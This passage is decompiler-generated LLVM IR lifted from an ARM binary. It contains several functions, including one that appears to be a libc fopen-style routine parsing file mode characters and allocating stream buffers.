  %v1_fe54 = add i32 %v2_fe4c, 1
  store i32 %v1_fe54, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe58 = icmp eq i32 %v3_fe50, 0
  store i32 %v1_fe54, i32* %v1_fe4c, align 4
  br i1 %v2_fe58, label %dec_label_pc_fe64, label %dec_label_pc_fec4

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe3c
  %v0_fe64 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe64 = load i32, i32* %r0.global-to-local, align 4
  %v2_fe64 = add i32 %v1_fe64, 8
  %v3_fe64 = inttoptr i32 %v2_fe64 to i32*
  store i32 %v0_fe64, i32* %v3_fe64, align 4
  %v0_fe68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fe68, i32* @r5, align 4
  br label %dec_label_pc_fe6c

dec_label_pc_fe6c:                                ; preds = %dec_label_pc_fe9c.dec_label_pc_fe6c_crit_edge, %dec_label_pc_fe64
  %v0_fe6c = phi i32 [ %v0_fe6c.pre, %dec_label_pc_fe9c.dec_label_pc_fe6c_crit_edge ], [ %v0_fe68, %dec_label_pc_fe64 ]
  %v1_fe6c = inttoptr i32 %v0_fe6c to i32*
  %v2_fe6c = load i32, i32* %v1_fe6c, align 4
  store i32 %v2_fe6c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_fe6c, i32* %r2.global-to-local, align 4
  %v2_fe7864 = load i32, i32* %v1_fe6c, align 4
  store i32 %v2_fe7864, i32* %r3.global-to-local, align 4
  %v3_fe7c66 = icmp uge i32 %v2_fe7864, %v2_fe6c
  store i1 %v3_fe7c66, i1* %cpsr_c.global-to-local, align 1
  %v9_fe7c72 = icmp eq i32 %v2_fe7864, %v2_fe6c
  br i1 %v9_fe7c72, label %dec_label_pc_fe84, label %dec_label_pc_fe9c

dec_label_pc_fe84:                                ; preds = %dec_label_pc_fe6c, %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge
  %v0_fe8473 = phi i32 [ %v1_fe7c.pre, %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge ], [ %v2_fe6c, %dec_label_pc_fe6c ]
  store i32 %v0_fe8473, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fe94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fe94, label %dec_label_pc_fe98, label %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge

dec_label_pc_fe84.dec_label_pc_fe78_crit_edge:    ; preds = %dec_label_pc_fe84
  %v0_fe78.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fe7c.pre = load i32, i32* @r4, align 4
  %v1_fe78 = inttoptr i32 %v0_fe78.pre to i32*
  %v2_fe78 = load i32, i32* %v1_fe78, align 4
  store i32 %v2_fe78, i32* %r3.global-to-local, align 4
  %v3_fe7c = icmp uge i32 %v2_fe78, %v1_fe7c.pre
  store i1 %v3_fe7c, i1* %cpsr_c.global-to-local, align 1
  %v9_fe7c = icmp eq i32 %v2_fe78, %v1_fe7c.pre
  br i1 %v9_fe7c, label %dec_label_pc_fe84, label %dec_label_pc_fe9c

dec_label_pc_fe98:                                ; preds = %dec_label_pc_fe84
  %v0_fe98 = load i32, i32* @r4, align 4
  store i32 %v0_fe98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe9c

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe6c, %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge, %dec_label_pc_fe98
  %v0_fea4 = phi i32 [ %v0_fe98, %dec_label_pc_fe98 ], [ %v2_fe7864, %dec_label_pc_fe6c ], [ %v2_fe78, %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge ]
  %v1_fe9c = phi i32 [ %v0_fe98, %dec_label_pc_fe98 ], [ %v2_fe6c, %dec_label_pc_fe6c ], [ %v1_fe7c.pre, %dec_label_pc_fe84.dec_label_pc_fe78_crit_edge ]
  %v3_fe9c = icmp uge i32 %v0_fea4, %v1_fe9c
  store i1 %v3_fe9c, i1* %cpsr_c.global-to-local, align 1
  %v9_fe9c = icmp eq i32 %v0_fea4, %v1_fe9c
  br i1 %v9_fe9c, label %dec_label_pc_fea4, label %dec_label_pc_fe9c.dec_label_pc_fe6c_crit_edge

dec_label_pc_fe9c.dec_label_pc_fe6c_crit_edge:    ; preds = %dec_label_pc_fe9c
  %v0_fe6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fe6c

dec_label_pc_fea4:                                ; preds = %dec_label_pc_fe9c
  %v2_fea4 = icmp ne i32 %v1_fe9c, 0
  store i1 %v2_fea4, i1* %cpsr_c.global-to-local, align 1
  %v7_fea8 = icmp slt i32 %v1_fe9c, 2
  br i1 %v7_fea8, label %dec_label_pc_fec4, label %dec_label_pc_feac

dec_label_pc_feac:                                ; preds = %dec_label_pc_fea4
  %v0_feac = load i32, i32* @r5, align 4
  store i32 %v0_feac, i32* %r0.global-to-local, align 4
  %v0_feb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_feb0 = add i32 %v0_feb0, 129
  store i32 %v1_feb0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_fe3c, %dec_label_pc_feac, %dec_label_pc_fea4
  %v0_fec4 = call i32 @function_107dc()
  %v0_fec8 = load i32, i32* @fp, align 4
  store i32 %v0_fec8, i32* %r0.global-to-local, align 4
  %v2_fed0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_fed0, i32* @r4, align 4
  store i32 %v6_fbb8, i32* @r5, align 4
  store i32 %v9_fbb8, i32* @r6, align 4
  store i32 %v12_fbb8, i32* @r7, align 4
  ret i32 %v0_fec8

; uselistorder directives
  uselistorder i32 %v0_fe98, { 1, 0, 2 }
  uselistorder i32 %v1_fe7c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fe6c, { 1, 0 }
  uselistorder i32 %v0_fe40, { 1, 0 }
  uselistorder i32 %v0_fe28, { 1, 0, 2 }
  uselistorder i32 %v1_fe0c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_fdf4, { 1, 0 }
  uselistorder i32 %v0_fdac, { 1, 0, 2 }
  uselistorder i32 %v1_fd90.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fd20, { 1, 0, 2 }
  uselistorder i32 %v1_fd04.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fcf4, { 1, 0 }
  uselistorder i32 %v0_fcb0, { 1, 0, 2 }
  uselistorder i32 %v1_fc94.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fc74, { 1, 0 }
  uselistorder i32 %v1_fc00.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 8, 10, 9, 5, 11, 12, 13, 14, 15, 17, 16, 1, 18, 21, 19, 20, 22, 24, 23, 4, 25, 26, 27, 28, 29, 31, 30, 0, 32, 33, 34, 35, 37, 36, 3, 38, 39, 40, 41, 42, 43, 44, 46, 45, 2, 6 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 26, 23, 24, 0, 25, 2, 3, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 7, 8, 9, 34, 35, 10, 11, 13, 12, 3, 14, 15, 16, 18, 17, 2, 19, 20, 21, 22, 24, 23, 0, 25, 26, 28, 27, 4, 29, 30, 31, 33, 32, 1, 5, 6 }
  uselistorder i32 (i32)* @function_e720, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_fec4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fe9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fe84, { 1, 0 }
  uselistorder label %dec_label_pc_fe3c, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_fe2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fe14, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_fdd8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_fdb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd98, { 1, 0 }
  uselistorder label %dec_label_pc_fd4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fd24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd0c, { 1, 0 }
  uselistorder label %dec_label_pc_fcc4, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_fcb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fc9c, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_fc3c, { 1, 0 }
  uselistorder label %dec_label_pc_fc30, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_fc20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fc08, { 1, 0 }
}

define i32 @function_fedc(i32 %arg1) local_unnamed_addr {
dec_label_pc_fedc:
  %v0_fedc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fedc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_fedc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fedc, %bb
  %v10_fee4 = phi i32 [ %arg1, %dec_label_pc_fedc ], [ 0, %bb ]
  ret i32 %v10_fee4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_fee8() local_unnamed_addr {
dec_label_pc_fee8:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fef8 = call i32 @function_ff08()
  ret i32 %v0_fef8
}

define i32 @function_ff08() local_unnamed_addr {
dec_label_pc_ff08:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_ff08 = load i32, i32* @r4, align 4
  store i32 %v3_ff08, i32* %stack_var_-24, align 4
  %v6_ff08 = load i32, i32* @r5, align 4
  %v9_ff08 = load i32, i32* @r6, align 4
  %v12_ff08 = load i32, i32* @r7, align 4
  %v15_ff08 = load i32, i32* @r8, align 4
  %v0_ff0c = load i32, i32* @r1, align 4
  %v1_ff0c = inttoptr i32 %v0_ff0c to i8*
  %v2_ff0c = load i8, i8* %v1_ff0c, align 1
  %v2_ff14 = icmp ugt i8 %v2_ff0c, 113
  store i1 %v2_ff14, i1* %cpsr_c.global-to-local, align 1
  %v7_ff14 = icmp eq i8 %v2_ff0c, 114
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r8, align 4
  %v0_ff20 = load i32, i32* @r0, align 4
  store i32 %v0_ff20, i32* @r7, align 4
  %v0_ff24 = load i32, i32* @r2, align 4
  store i32 %v0_ff24, i32* @r5, align 4
  %v0_ff28 = load i32, i32* @r3, align 4
  store i32 %v0_ff28, i32* @r6, align 4
  br i1 %v7_ff14, label %dec_label_pc_ff7c, label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %dec_label_pc_ff08
  %v2_ff30 = icmp ugt i8 %v2_ff0c, 118
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  %v7_ff30 = icmp eq i8 %v2_ff0c, 119
  br i1 %v7_ff30, label %bb, label %dec_label_pc_ff3c

bb:                                               ; preds = %dec_label_pc_ff30
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff30
  %v2_ff3c = icmp ugt i8 %v2_ff0c, 96
  store i1 %v2_ff3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff3c = icmp eq i8 %v2_ff0c, 97
  br i1 %v7_ff3c, label %bb49, label %dec_label_pc_ff48

bb49:                                             ; preds = %dec_label_pc_ff3c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff48:                                ; preds = %dec_label_pc_ff3c, %dec_label_pc_10018, %dec_label_pc_ffec
  store i32 54144, i32* %r2.global-to-local, align 4
  %v0_ff4c = call i32 @function_f150()
  store i32 %v0_ff4c, i32* %r0.global-to-local, align 4
  %v3_ff50 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_ff50 = sext i16 %v3_ff50 to i32
  store i32 %v4_ff50, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_ff58 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff58 = icmp eq i32 %v0_ff58, 0
  %v3_ff5c = add i32 %v4_ff50, %v0_ff4c
  %v4_ff5c = inttoptr i32 %v3_ff5c to i32*
  store i32 22, i32* %v4_ff5c, align 4
  br i1 %v2_ff58, label %dec_label_pc_10320, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_1003c._crit_edge, %dec_label_pc_ff48
  %v0_ff64 = load i32, i32* @r5, align 4
  %v1_ff64 = inttoptr i32 %v0_ff64 to i16*
  %v2_ff64 = load i16, i16* %v1_ff64, align 2
  %v3_ff64 = zext i16 %v2_ff64 to i32
  store i32 %v3_ff64, i32* %r3.global-to-local, align 4
  %v1_ff68 = and i32 %v3_ff64, 8192
  %v2_ff68 = icmp eq i32 %v1_ff68, 0
  br i1 %v2_ff68, label %dec_label_pc_10320, label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_ff64
  store i32 %v0_ff64, i32* @r0, align 4
  %v0_ff74 = call i32 @function_d458()
  store i32 %v0_ff74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10320

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff08
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %bb, %bb49, %dec_label_pc_ff7c
  %v1_ff98 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_ff7c ]
  %v1_ff80 = add i32 %v0_ff0c, 1
  %v2_ff80 = inttoptr i32 %v1_ff80 to i8*
  %v3_ff80 = load i8, i8* %v2_ff80, align 1
  %v2_ff84 = icmp ugt i8 %v3_ff80, 97
  store i1 %v2_ff84, i1* %cpsr_c.global-to-local, align 1
  %v7_ff84 = icmp eq i8 %v3_ff80, 98
  %v1_ff80.v0_ff0c = select i1 %v7_ff84, i32 %v1_ff80, i32 %v0_ff0c
  store i32 %v1_ff80.v0_ff0c, i32* %r3.global-to-local, align 4
  %v1_ff90 = add i32 %v1_ff80.v0_ff0c, 1
  %v2_ff90 = inttoptr i32 %v1_ff90 to i8*
  %v3_ff90 = load i8, i8* %v2_ff90, align 1
  %v4_ff90 = zext i8 %v3_ff90 to i32
  store i32 %v4_ff90, i32* @r3, align 4
  %v2_ff94 = icmp ugt i8 %v3_ff90, 42
  store i1 %v2_ff94, i1* %cpsr_c.global-to-local, align 1
  %v7_ff94 = icmp eq i8 %v3_ff90, 43
  br i1 %v7_ff94, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_ff80
  store i32 %v1_ff98, i32* @r3, align 4
  %v2_ff9c = add nuw nsw i32 %v1_ff98, 1
  store i32 %v2_ff9c, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ff80, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffa0 = icmp eq i32 %v0_ff24, 0
  br i1 %v2_ffa0, label %dec_label_pc_ffa8, label %dec_label_pc_ffe4

dec_label_pc_ffa8:                                ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_ffac = call i32 @function_c77c(i32 68)
  store i32 %v1_ffac, i32* %r0.global-to-local, align 4
  store i32 %v1_ffac, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_ffb0 = icmp eq i32 %v1_ffac, 0
  br i1 %v3_ffb0, label %dec_label_pc_10324, label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %dec_label_pc_ffa8
  %v0_ffbc = load i32, i32* @r8, align 4
  %v2_ffbc = add i32 %v0_ffbc, -33136
  store i32 %v2_ffbc, i32* %r3.global-to-local, align 4
  %v1_ffc0 = inttoptr i32 %v2_ffbc to i32*
  %v2_ffc0 = load i32, i32* %v1_ffc0, align 4
  store i32 %v2_ffc0, i32* %r0.global-to-local, align 4
  %v3_ffc0 = add i32 %v0_ffbc, -33132
  %v4_ffc0 = inttoptr i32 %v3_ffc0 to i32*
  %v5_ffc0 = load i32, i32* %v4_ffc0, align 4
  store i32 %v5_ffc0, i32* @r1, align 4
  %v6_ffc0 = add i32 %v0_ffbc, -33128
  %v7_ffc0 = inttoptr i32 %v6_ffc0 to i32*
  %v8_ffc0 = load i32, i32* %v7_ffc0, align 4
  store i32 %v8_ffc0, i32* %r2.global-to-local, align 4
  %v2_ffcc = add i32 %v1_ffac, 8
  %v3_ffcc = inttoptr i32 %v2_ffcc to i32*
  store i32 0, i32* %v3_ffcc, align 4
  %v2_ffd4 = load i32, i32* @r5, align 4
  %v3_ffd4 = inttoptr i32 %v2_ffd4 to i16*
  store i16 8192, i16* %v3_ffd4, align 2
  %v2_ffd8 = load i32, i32* %r0.global-to-local, align 4
  %v0_ffdc = load i32, i32* @r5, align 4
  %v1_ffdc = add i32 %v0_ffdc, 56
  store i32 %v1_ffdc, i32* @r3, align 4
  %v1_ffe0 = inttoptr i32 %v1_ffdc to i32*
  store i32 %v2_ffd8, i32* %v1_ffe0, align 4
  %v3_ffe0 = add i32 %v0_ffdc, 60
  %v4_ffe0 = inttoptr i32 %v3_ffe0 to i32*
  %v5_ffe0 = load i32, i32* @r1, align 4
  store i32 %v5_ffe0, i32* %v4_ffe0, align 4
  %v6_ffe0 = add i32 %v0_ffdc, 64
  %v7_ffe0 = inttoptr i32 %v6_ffe0 to i32*
  %v8_ffe0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_ffe0, i32* %v7_ffe0, align 4
  %v0_ffe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %.thread3, %dec_label_pc_ffb8
  %v0_1003c = phi i32 [ %v0_ff28, %.thread3 ], [ %v0_ffe4.pre, %dec_label_pc_ffb8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_ffe4 = icmp slt i32 %v0_1003c, 0
  br i1 %v1_ffe4, label %dec_label_pc_1003c, label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ffe4
  %v0_fff0 = load i32, i32* @r4, align 4
  %v2_fff0 = and i32 %v0_fff0, ptrtoint (i32* @global_var_20003.456 to i32)
  %v1_fff4 = or i32 %v2_fff0, 1
  store i32 %v1_fff4, i32* %r2.global-to-local, align 4
  %v0_fff8 = load i32, i32* @r7, align 4
  %v1_fff8 = add i32 %v0_fff8, 1
  %v2_fffc = and i32 %v1_fff8, %v1_fff4
  store i32 %v2_fffc, i32* %r3.global-to-local, align 4
  %v3_10000 = icmp uge i32 %v2_fffc, %v1_fff4
  store i1 %v3_10000, i1* %cpsr_c.global-to-local, align 1
  %v9_10000 = icmp eq i32 %v2_fffc, %v1_fff4
  %v1_10004 = load i32, i32* @r5, align 4
  %v2_10004 = add i32 %v1_10004, 4
  %v3_10004 = inttoptr i32 %v2_10004 to i32*
  store i32 %v0_1003c, i32* %v3_10004, align 4
  br i1 %v9_10000, label %dec_label_pc_1000c, label %dec_label_pc_ff48

dec_label_pc_1000c:                               ; preds = %dec_label_pc_ffec
  %v0_1000c = load i32, i32* @r4, align 4
  %v1_1000c = load i32, i32* @r7, align 4
  %v2_1000c = sub i32 -1, %v1_1000c
  %v3_1000c = and i32 %v0_1000c, %v2_1000c
  store i32 %v3_1000c, i32* @r3, align 4
  %v1_10010 = and i32 %v3_1000c, 1024
  %v2_10010 = icmp eq i32 %v1_10010, 0
  br i1 %v2_10010, label %dec_label_pc_10030, label %dec_label_pc_10018

dec_label_pc_10018:                               ; preds = %dec_label_pc_1000c
  %v0_10018 = load i32, i32* @r6, align 4
  store i32 %v0_10018, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_10024 = call i32 @function_b7ac(i32 %v0_10018, i32 4)
  store i32 %v2_10024, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10028 = icmp eq i32 %v2_10024, 0
  br i1 %v2_10028, label %dec_label_pc_10018.dec_label_pc_10030_crit_edge, label %dec_label_pc_ff48

dec_label_pc_10018.dec_label_pc_10030_crit_edge:  ; preds = %dec_label_pc_10018
  %v0_10030.pre = load i32, i32* @r7, align 4
  %v0_10034.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10030

dec_label_pc_10030:                               ; preds = %dec_label_pc_10018.dec_label_pc_10030_crit_edge, %dec_label_pc_1000c
  %v0_10034 = phi i32 [ %v0_10034.pre, %dec_label_pc_10018.dec_label_pc_10030_crit_edge ], [ %v0_1000c, %dec_label_pc_1000c ]
  %v0_10030 = phi i32 [ %v0_10030.pre, %dec_label_pc_10018.dec_label_pc_10030_crit_edge ], [ %v1_1000c, %dec_label_pc_1000c ]
  %v1_10030 = and i32 %v0_10030, 131072
  store i32 %v1_10030, i32* %r3.global-to-local, align 4
  %v2_10034 = or i32 %v1_10030, %v0_10034
  store i32 %v2_10034, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10060

dec_label_pc_1003c:                               ; preds = %dec_label_pc_ffe4
  %v2_1003c = icmp eq i32 %v0_1003c, -1
  store i1 %v2_1003c, i1* %cpsr_c.global-to-local, align 1
  %v7_1003c = icmp eq i32 %v0_1003c, -1
  %v0_10048.pre = load i32, i32* @r4, align 4
  br i1 %v7_1003c, label %dec_label_pc_1003c._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_1003c
  %v2_10040 = or i32 %v0_10048.pre, ptrtoint (i32* @global_var_20000.340 to i32)
  store i32 %v2_10040, i32* @r4, align 4
  br label %dec_label_pc_1003c._crit_edge

dec_label_pc_1003c._crit_edge:                    ; preds = %dec_label_pc_1003c, %bb53
  %v0_10048 = phi i32 [ %v2_10040, %bb53 ], [ %v0_10048.pre, %dec_label_pc_1003c ]
  %v0_10044 = load i32, i32* @r7, align 4
  store i32 %v0_10044, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_10050 = call i32 @function_e7b0(i32 %v0_10044, i32 %v0_10048)
  store i32 %v2_10050, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_10054 = icmp slt i32 %v2_10050, 0
  %v1_10058 = load i32, i32* @r5, align 4
  %v2_10058 = add i32 %v1_10058, 4
  %v3_10058 = inttoptr i32 %v2_10058 to i32*
  store i32 %v2_10050, i32* %v3_10058, align 4
  br i1 %v1_10054, label %dec_label_pc_ff64, label %.dec_label_pc_10060_crit_edge

.dec_label_pc_10060_crit_edge:                    ; preds = %dec_label_pc_1003c._crit_edge
  %v0_10064.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %.dec_label_pc_10060_crit_edge, %dec_label_pc_10030
  %v0_1007c = phi i32 [ %v0_10064.pre, %.dec_label_pc_10060_crit_edge ], [ %v2_10034, %dec_label_pc_10030 ]
  %v0_10060 = load i32, i32* @r5, align 4
  %v1_10060 = inttoptr i32 %v0_10060 to i16*
  %v2_10060 = load i16, i16* %v1_10060, align 2
  %v3_10060 = zext i16 %v2_10060 to i32
  %v1_10064 = urem i32 %v0_1007c, 4
  %v1_10068 = and i32 %v0_1007c, 1024
  %v1_1006c = and i32 %v3_10060, 8192
  %v1_10070 = add nuw nsw i32 %v1_10064, 1
  %v2_10074 = or i32 %v1_1006c, %v1_10068
  store i32 %v2_10074, i32* %r3.global-to-local, align 4
  %v1_10078 = xor i32 %v1_10070, 3
  %v1_1007c = and i32 %v0_1007c, ptrtoint (i32* @global_var_20000.340 to i32)
  store i32 %v1_1007c, i32* %r2.global-to-local, align 4
  %v2_1007c = icmp eq i32 %v1_1007c, 0
  %v1_10080 = add i32 %v0_10060, 4
  %v2_10080 = inttoptr i32 %v1_10080 to i32*
  %v3_10080 = load i32, i32* %v2_10080, align 4
  store i32 %v3_10080, i32* @r4, align 4
  br i1 %v2_1007c, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_10060
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_10060, %bb54
  %v0_1008c = phi i32 [ 0, %dec_label_pc_10060 ], [ 32768, %bb54 ]
  %v4_10088 = mul nuw nsw i32 %v1_10078, 16
  %v5_10088 = or i32 %v2_10074, %v4_10088
  store i32 %v5_10088, i32* %r3.global-to-local, align 4
  %v2_1008c = or i32 %v0_1008c, %v5_10088
  store i32 %v2_1008c, i32* %r2.global-to-local, align 4
  %v2_10090 = icmp ugt i32 %v3_10080, 2147483646
  store i1 %v2_10090, i1* %cpsr_c.global-to-local, align 1
  %v8_10090 = icmp eq i32 %v3_10080, 2147483647
  %v1_10094 = trunc i32 %v2_1008c to i16
  store i16 %v1_10094, i16* %v1_10060, align 2
  br i1 %v8_10090, label %dec_label_pc_100d4, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %bb55
  store i32 53804, i32* %r3.global-to-local, align 4
  %v0_100a0 = call i32 @function_f150()
  %v3_100a4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_100a4 = sext i16 %v3_100a4 to i32
  store i32 %v4_100a4, i32* @r3, align 4
  store i32 %v0_100a0, i32* @r6, align 4
  %v0_100ac = load i32, i32* @r4, align 4
  store i32 %v0_100ac, i32* @r0, align 4
  %v2_100b0 = add i32 %v4_100a4, %v0_100a0
  %v3_100b0 = inttoptr i32 %v2_100b0 to i32*
  %v4_100b0 = load i32, i32* %v3_100b0, align 4
  store i32 %v4_100b0, i32* @r4, align 4
  %v1_100b4 = call i32 @function_117dc(i32 %v0_100ac)
  store i32 %v1_100b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100b8 = icmp eq i32 %v1_100b4, 0
  br i1 %v2_100b8, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_1009c
  %v1_100bc = load i32, i32* @r5, align 4
  %v2_100bc = inttoptr i32 %v1_100bc to i16*
  %v3_100bc = load i16, i16* %v2_100bc, align 2
  %v4_100bc = zext i16 %v3_100bc to i32
  %v2_100c0 = or i32 %v4_100bc, 256
  store i32 %v2_100c0, i32* %r3.global-to-local, align 4
  %v2_100c4 = trunc i32 %v2_100c0 to i16
  store i16 %v2_100c4, i16* %v2_100bc, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1009c, %bb56
  %v3_100cc = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_100cc = sext i16 %v3_100cc to i32
  store i32 %v4_100cc, i32* %r3.global-to-local, align 4
  %v0_100d0 = load i32, i32* @r4, align 4
  %v1_100d0 = load i32, i32* @r6, align 4
  %v3_100d0 = add i32 %v1_100d0, %v4_100cc
  %v4_100d0 = inttoptr i32 %v3_100d0 to i32*
  store i32 %v0_100d0, i32* %v4_100d0, align 4
  br label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %bb55, %.thread5
  %v0_100d4 = load i32, i32* @r5, align 4
  %v1_100d4 = add i32 %v0_100d4, 8
  %v2_100d4 = inttoptr i32 %v1_100d4 to i32*
  %v3_100d4 = load i32, i32* %v2_100d4, align 4
  store i32 %v3_100d4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100d8 = icmp eq i32 %v3_100d4, 0
  br i1 %v2_100d8, label %dec_label_pc_100e0, label %bb57

dec_label_pc_100e0:                               ; preds = %dec_label_pc_100d4
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_100e4 = call i32 @function_c77c(i32 4096)
  store i32 %v1_100e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100e8 = icmp eq i32 %v1_100e4, 0
  %v1_100f8.pre = load i32, i32* @r5, align 4
  br i1 %v2_100e8, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_100e0
  %v2_100ec = inttoptr i32 %v1_100f8.pre to i16*
  %v3_100ec = load i16, i16* %v2_100ec, align 2
  %v4_100ec = zext i16 %v3_100ec to i32
  %v2_100f0 = add i32 %v1_100e4, 4096
  store i32 %v2_100f0, i32* %r2.global-to-local, align 4
  %v2_100f4 = or i32 %v4_100ec, 16384
  store i32 %v2_100f4, i32* %r3.global-to-local, align 4
  %v2_100f8 = add i32 %v1_100f8.pre, 8
  %v3_100f8 = inttoptr i32 %v2_100f8 to i32*
  store i32 %v1_100e4, i32* %v3_100f8, align 4
  %v1_100fc = load i32, i32* %r2.global-to-local, align 4
  %v2_100fc = load i32, i32* @r5, align 4
  %v3_100fc = add i32 %v2_100fc, 12
  %v4_100fc = inttoptr i32 %v3_100fc to i32*
  store i32 %v1_100fc, i32* %v4_100fc, align 4
